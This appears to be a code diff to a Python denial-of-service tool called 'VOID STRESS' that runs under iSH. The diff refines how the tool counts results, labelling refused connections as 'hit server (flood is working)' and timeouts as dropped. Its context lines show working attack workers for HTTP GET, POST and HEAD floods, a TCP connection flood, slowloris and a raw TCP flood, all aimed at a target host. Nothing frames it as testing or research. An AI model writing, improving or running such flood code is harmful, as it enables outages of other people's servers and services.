@@ -19,17 +19,26 @@ import subprocess, sys, os
 def _ensure(mod, pkg):
     try:
         __import__(mod)
+        return
     except ImportError:
-        print(f"[*] Installing {pkg}...")
+        pass
+    print(f"[*] Installing {pkg}...")
+    cmds = [
+        [sys.executable, "-m", "pip", "install", pkg, "-q"],
+        ["pip3", "install", pkg, "-q"],
+        ["pip",  "install", pkg, "-q"],
+    ]
+    for cmd in cmds:
         try:
-            subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", pkg,
-                 "-q", "--break-system-packages"],
+            subprocess.check_call(cmd,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return
         except Exception:
-            subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", pkg, "-q"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            continue
+    print(f"[!] Could not install {pkg}.")
+    print(f"    Fix:  apk add py3-pip && pip3 install {pkg}")
+    print(f"    Or just run:  sh ddos.sh")
+    sys.exit(1)
 
 _ensure("rich",     "rich")
 _ensure("requests", "requests")
@@ -53,37 +62,50 @@ stop_event = threading.Event()
 # STATS
 # ══════════════════════════════════════════════════════════════════
 
+import errno as _errno
+
 class Stats:
     def __init__(self):
-        self._lock   = threading.Lock()
-        self.sent    = 0
-        self.success = 0
-        self.errors  = 0
-        self.bytes   = 0
-        self._t0     = time.time()
+        self._lock    = threading.Lock()
+        self.sent     = 0
+        self.success  = 0
+        self.n_refused = 0   # ECONNREFUSED — packet reached server (flood working)
+        self.n_timeout = 0   # timeout      — dropped / overwhelmed
+        self.n_error   = 0   # other
+        self.bytes    = 0
+        self._t0      = time.time()
 
     def ok(self, nbytes: int = 0):
         with self._lock:
-            self.sent    += 1
-            self.success += 1
-            self.bytes   += nbytes
+            self.sent     += 1
+            self.success  += 1
+            self.bytes    += nbytes
 
-    def err(self):
+    def add_exc(self, exc: Exception):
+        code = getattr(exc, "errno", None)
         with self._lock:
-            self.sent   += 1
-            self.errors += 1
+            self.sent += 1
+            if code in (_errno.ECONNREFUSED, _errno.ECONNRESET):
+                self.n_refused += 1
+            elif isinstance(exc, (TimeoutError, socket.timeout, OSError)) and \
+                 code in (_errno.ETIMEDOUT, None):
+                self.n_timeout += 1
+            else:
+                self.n_error += 1
 
     def snap(self):
         with self._lock:
             elapsed = max(time.time() - self._t0, 0.001)
             return {
-                "sent":    self.sent,
-                "success": self.success,
-                "errors":  self.errors,
-                "bytes":   self.bytes,
-                "elapsed": elapsed,
-                "pps":     self.sent / elapsed,
-                "bps":     self.bytes / elapsed,
+                "sent":     self.sent,
+                "success":  self.success,
+                "refused":  self.n_refused,
+                "timeout":  self.n_timeout,
+                "errors":   self.n_error,
+                "bytes":    self.bytes,
+                "elapsed":  elapsed,
+                "pps":      self.sent / elapsed,
+                "bps":      self.bytes / elapsed,
             }
 
 # ══════════════════════════════════════════════════════════════════
@@ -147,8 +169,8 @@ def _worker_http_get(target: str, port: int, host: str, stats: Stats):
                 f"{url_base}{path}{buster}", headers=_headers(host),
                 timeout=4, allow_redirects=False, stream=False)
             stats.ok(len(r.content))
-        except Exception:
-            stats.err()
+        except Exception as e:
+            stats.add_exc(e)
 
 def _worker_http_post(target: str, port: int, host: str, stats: Stats):
     """Mode 2 — HTTP POST flood with random body"""
@@ -161,8 +183,8 @@ def _worker_http_post(target: str, port: int, host: str, stats: Stats):
                 f"{url_base}{path}", headers=_headers(host),
                 data=body, timeout=4, allow_redirects=False)
             stats.ok(len(r.content))
-        except Exception:
-            stats.err()
+        except Exception as e:
+            stats.add_exc(e)
 
 def _worker_tcp_connect(target: str, port: int, stats: Stats):
     """Mode 3 — TCP connection flood (no raw sockets)"""
@@ -175,8 +197,8 @@ def _worker_tcp_connect(target: str, port: int, stats: Stats):
             s.sendall(b"GET / HTTP/1.1\r\n")
             time.sleep(random.uniform(0.1, 0.4))
             stats.ok(18)
-        except Exception:
-            stats.err()
+        except Exception as e:
+            stats.add_exc(e)
         finally:
             if s:
                 try: s.close()
@@ -207,9 +229,9 @@ def _worker_slowloris(target: str, port: int, host: str, stats: Stats):
             try:
                 s.sendall(f"X-Keep: {_rand_str()}\r\n".encode())
                 stats.ok(20)
-            except Exception:
+            except Exception as e:
                 dead.append(s)
-                stats.err()
+                stats.add_exc(e)
 
         for s in dead:
             try: s.close()
@@ -234,8 +256,8 @@ def _worker_http_head(target: str, port: int, host: str, stats: Stats):
                 headers=_headers(host), timeout=3,
                 allow_redirects=False)
             stats.ok(len(str(r.headers)))
-        except Exception:
-            stats.err()
+        except Exception as e:
+            stats.add_exc(e)
             sess = requests.Session()
 
 def _worker_raw_tcp(target: str, port: int, host: str, stats: Stats):
@@ -258,8 +280,8 @@ def _worker_raw_tcp(target: str, port: int, host: str, stats: Stats):
             s.sendall(payload)
             resp = s.recv(512)
             stats.ok(len(resp))
-        except Exception:
-            stats.err()
+        except Exception as e:
+            stats.add_exc(e)
         finally:
             if s:
                 try: s.close()
@@ -366,24 +388,33 @@ def _make_panel(snap: dict, label: str, col: str) -> Panel:
     t.add_column(style="bold white", no_wrap=True)
     t.add_column(no_wrap=True)
 
-    sent      = snap["sent"]
-    ok        = snap["success"]
-    err       = snap["errors"]
-    pps       = snap["pps"]
-    bps       = snap["bps"]
-    ok_ratio  = ok  / max(sent, 1)
-    err_ratio = err / max(sent, 1)
+    sent     = snap["sent"]
+    ok       = snap["success"]
+    refused  = snap["refused"]
+    timeout  = snap["timeout"]
+    err      = snap["errors"]
+    pps      = snap["pps"]
+    bps      = snap["bps"]
 
-    t.add_row("Mode",      f"[bold {col}]{label}[/]",          "")
-    t.add_row("Elapsed",   f"{snap['elapsed']:.0f}s",          "")
-    t.add_row("Sent",      f"{sent:,}",                        "")
-    t.add_row("Success",   f"[green]{ok:,}[/]",
-              _bar(ok_ratio,  16, "green"))
-    t.add_row("Errors",    f"[red]{err:,}[/]",
-              _bar(err_ratio, 16, "red"))
-    t.add_row("Req/s",     f"[bright_red]{pps:,.1f}[/]",
+    ok_r  = ok      / max(sent, 1)
+    ref_r = refused / max(sent, 1)
+    to_r  = timeout / max(sent, 1)
+
+    t.add_row("Mode",     f"[bold {col}]{label}[/]",                 "")
+    t.add_row("Elapsed",  f"{snap['elapsed']:.0f}s",                 "")
+    t.add_row("Sent",     f"{sent:,}",                               "")
+    t.add_row("Success",  f"[green]{ok:,}[/]",
+              _bar(ok_r,  16, "green"))
+    # Refused = packet reached server (flood is working)
+    t.add_row("Refused",  f"[yellow]{refused:,}[/]  [dim](hit server)[/]",
+              _bar(ref_r, 16, "yellow"))
+    t.add_row("Timeout",  f"[red]{timeout:,}[/]  [dim](dropped)[/]",
+              _bar(to_r,  16, "red"))
+    if err:
+        t.add_row("Other err", f"[dim red]{err:,}[/]",              "")
+    t.add_row("Req/s",    f"[bright_red]{pps:,.1f}[/]",
               _bar(min(pps / 500, 1.0), 16, col))
-    t.add_row("Bandwidth", f"[cyan]{_fmt_bytes(bps)}[/]",      "")
+    t.add_row("Bandwidth",f"[cyan]{_fmt_bytes(bps)}[/]",             "")
     return Panel(t, title=f"[bold {col}]VOID STRESS — iSH[/]",
                  border_style=col, padding=(0, 1))
 
@@ -442,8 +473,6 @@ def run(target_ip: str, target_host: str, port: int, mode: dict, n_threads: int)
 
     # ── summary ───────────────────────────────────────────────────
     snap = stats.snap()
-    loss_pct = snap["errors"] / max(snap["sent"], 1) * 100
-    loss_col = "green" if loss_pct < 5 else ("yellow" if loss_pct < 25 else "red")
 
     console.print()
     console.print(Rule(style="bright_red"))
@@ -451,18 +480,22 @@ def run(target_ip: str, target_host: str, port: int, mode: dict, n_threads: int)
     console.print(Rule(style="bright_red"))
     console.print()
 
+    ref_pct = snap["refused"] / max(snap["sent"], 1) * 100
+    to_pct  = snap["timeout"] / max(snap["sent"], 1) * 100
+
     tbl = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
     tbl.add_column(style="dim",        no_wrap=True)
     tbl.add_column(style="bold white", no_wrap=True)
-    tbl.add_row("Target",       f"{target_host} ({target_ip}:{port})")
-    tbl.add_row("Mode",         f"[bold {col}]{label}[/]")
-    tbl.add_row("Duration",     f"{snap['elapsed']:.1f}s")
-    tbl.add_row("Total Sent",   f"{snap['sent']:,}")
-    tbl.add_row("Success",      f"[green]{snap['success']:,}[/]")
-    tbl.add_row("Errors",       f"[{loss_col}]{snap['errors']:,} ({loss_pct:.1f}%)[/]")
-    tbl.add_row("Avg Req/s",    f"[bright_red]{snap['pps']:,.1f}[/]")
-    tbl.add_row("Avg Bandwidth",f"[cyan]{_fmt_bytes(snap['bps'])}[/]")
-    tbl.add_row("Total Data",   f"[cyan]{snap['bytes']/1024:.1f} KB[/]")
+    tbl.add_row("Target",        f"{target_host} ({target_ip}:{port})")
+    tbl.add_row("Mode",          f"[bold {col}]{label}[/]")
+    tbl.add_row("Duration",      f"{snap['elapsed']:.1f}s")
+    tbl.add_row("Total Sent",    f"{snap['sent']:,}")
+    tbl.add_row("Success",       f"[green]{snap['success']:,}[/]")
+    tbl.add_row("Refused",       f"[yellow]{snap['refused']:,} ({ref_pct:.1f}%)[/]  [dim]← hit server[/]")
+    tbl.add_row("Timeout",       f"[red]{snap['timeout']:,} ({to_pct:.1f}%)[/]  [dim]← dropped[/]")
+    tbl.add_row("Avg Req/s",     f"[bright_red]{snap['pps']:,.1f}[/]")
+    tbl.add_row("Avg Bandwidth", f"[cyan]{_fmt_bytes(snap['bps'])}[/]")
+    tbl.add_row("Total Data",    f"[cyan]{snap['bytes']/1024:.1f} KB[/]")
     console.print(Align.center(tbl))
     console.print()
     console.print(Rule(style="bright_red"))
